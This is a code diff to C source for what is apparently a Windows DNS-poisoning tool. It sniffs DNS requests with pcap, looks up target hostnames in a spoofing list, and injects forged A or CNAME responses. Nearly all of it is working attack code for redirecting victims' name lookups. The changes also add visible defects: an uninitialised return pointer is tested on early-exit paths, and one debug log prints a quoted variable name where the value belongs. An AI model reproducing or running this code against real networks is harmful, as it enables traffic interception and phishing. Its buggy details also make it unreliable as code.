@@ -15,7 +15,7 @@
 extern PHOSTNODE gDnsSpoofingList;
 
 
-BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNODE spoofingRecord, char *srcIp, char *dstIp)
+BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PPOISONING_DATA spoofingRecord, char *srcIp, char *dstIp)
 {
   BOOL retVal = FALSE;
   unsigned char *spoofedDnsResponse = NULL;
@@ -25,14 +25,16 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNO
   int counter = 0;
   char errbuf[PCAP_ERRBUF_SIZE];
   
+
   // Create DNS response data block
-  if (spoofingRecord->Data.Type == RESP_A)
+  if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_A)
   {
-    responseData = CreateDnsResponse_A(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.SpoofedIp);
+    responseData = CreateDnsResponse_A(spoofingRecord->HostnodeToSpoof->Data.HostName, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp);
   }
-  else if (spoofingRecord->Data.Type == RESP_CNAME)
+  else if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_CNAME)
   {
-    responseData = CreateDnsResponse_CNAME(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.CnameHost, spoofingRecord->Data.SpoofedIp);
+LogMsg(DBG_INFO, "DnsRequestSpoofing(0.2): Data.HostName=%s, Data.CnameHost=%s, Data.SpoofedIp=%s", spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.CnameHost, "spoofingRecord->Data.SpoofedIp");
+    responseData = CreateDnsResponse_CNAME(spoofingRecord->HostnameToSpoof, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp);
   }
 
   if (responseData == NULL)
@@ -60,7 +62,7 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNO
     if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
     {
       LogMsg(DBG_HIGH, "%2d Request DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
-        counter, funcRetVal, spoofingRecord->Data.HostName, spoofingRecord->Data.SpoofedIp, deviceHandle);
+        counter, funcRetVal, spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, deviceHandle);
       retVal = FALSE;
     }
     else 
@@ -172,7 +174,7 @@ void FixNetworkLayerData4Request(unsigned char * data, PRAW_DNS_DATA responseDat
 }
 
 
-void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
+PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
 {
   PETHDR ethrHdr = (PETHDR)dataParam;
   PIPHDR ipHdr = NULL;
@@ -180,7 +182,7 @@ void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   int ipHdrLen = 0;
   char *data = NULL;
   char *dnsData = NULL;
-  PHOSTNODE retVal = NULL;
+  PPOISONING_DATA retVal;
   PHOSTNODE tmpNode = NULL;
   PDNS_HEADER dnsHdr = NULL;
   unsigned char *reader = NULL;
@@ -193,20 +195,20 @@ void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   {
     goto END;
   }
-
+  
   ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));
   if (ipHdr == NULL || 
       ipHdr->proto != IP_PROTO_UDP)
   {
     goto END;
   }
-
+  
   ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
   if (ipHdrLen <= 0)
   {
     goto END;
   }
-
+  
   updHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
   if (updHdr == NULL ||
       updHdr->ulen <= 0 ||
@@ -232,16 +234,29 @@ void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   {
     goto END;
   }
+  
+  if ((retVal = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(POISONING_DATA))) == NULL)
+  {
+    goto END;
+  }
 
+  strncpy(retVal->HostnameToSpoof, peerName, strnlen(peerName, sizeof(retVal->HostnameToSpoof) - 1));
   if ((tmpNode = GetNodeByHostname(gDnsSpoofingList, peerName)) != NULL)
   {
-    retVal = tmpNode;
+    retVal->HostnodeToSpoof = tmpNode;
   }
 
 END:
-  if (tmpNode != NULL)
+  if (peerName != NULL)
   {
     HeapFree(GetProcessHeap(), 0, peerName);
+  }
+
+  if (tmpNode == NULL &&
+      retVal != NULL)
+  {
+    HeapFree(GetProcessHeap(), 0, retVal);
+    retVal = NULL;
   }
 
   return retVal;
